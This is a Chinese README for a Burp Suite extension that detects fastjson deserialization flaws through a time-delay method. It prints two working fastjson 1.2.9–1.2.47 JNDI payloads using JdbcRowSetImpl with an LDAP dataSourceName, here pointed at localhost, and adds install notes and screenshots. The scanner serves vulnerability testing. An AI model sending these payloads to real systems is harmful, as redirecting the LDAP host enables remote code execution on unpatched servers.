## 前言

学习了pmiaowu的fastjson扫描插件，其主要是两种检测方式

一种是利用c3p0回显探测

一种是利用dnslog探测

想了想如果不存在回显且对方不出网的情况下，就扫描不到了

所以添加了一种延迟探测方式，当回显以及dnslog无法探测出时采用延迟探测方式

根据访问开放端口与关闭端口的响应时间不同来判断是否存在漏洞点

fastjson 1.2.9-1.2.47

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:808/badNameClass",
        "autoCommit":true
    }
}
```

还有一种通用payload,可用于parseObject的场景，但是测试了一下发现上面这个也行

```json
{"@type":"com.alibaba.fastjson.JSONObject",{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"ldap://localhost:8088/badNameClass",
        "autoCommit":true
    }
}}""}
```

https://mp.weixin.qq.com/s/5mO1L5o8j_m6RYM6nO-pAA

## 安装

 ![image-20220923205653176](F:\红队\14-Fj插件编写\BurpFastJsonScan-main\images\image-20220923205653176.png)

将target\BurpFastJsonScan下jar包导入

## 效果展示

![image-20220923212341248](F:\红队\14-Fj插件编写\BurpFastJsonScan-main\images\image-20220923212341248.png)

![image-20220923212355278](F:\红队\14-Fj插件编写\BurpFastJsonScan-main\images\image-20220923212355278.png)

![image-20220923212404351](F:\红队\14-Fj插件编写\BurpFastJsonScan-main\images\image-20220923212404351.png)

![image-20220923212444871](F:\红队\14-Fj插件编写\BurpFastJsonScan-main\images\image-20220923212444871.png)